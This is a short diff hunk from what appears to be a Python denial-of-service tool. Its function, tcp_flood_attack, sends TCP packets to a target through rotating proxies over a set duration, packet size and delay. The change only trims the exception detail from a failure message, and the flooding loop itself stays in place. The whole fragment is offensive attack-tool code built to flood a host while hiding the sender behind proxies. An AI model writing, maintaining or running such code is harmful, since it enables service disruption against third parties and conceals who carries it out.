@@ -17,7 +17,7 @@ def tcp_flood_attack(target, proxies, duration, packet_size, packet_delay):
             sock.send(payload.encode())
             print(f"✅ TCP packet sent to {host}:{port} via {proxy['host']}:{proxy['port']}")
         except Exception as e:
-            print(f"❌ TCP packet to {host}:{port} via {proxy['host']}:{proxy['port']} failed: {e}")
+            print(f"❌ TCP packet to {host}:{port} via {proxy['host']}:{proxy['port']} failed")
         finally:
             sock.close()
         elapsed_time = time.time() - start_time  
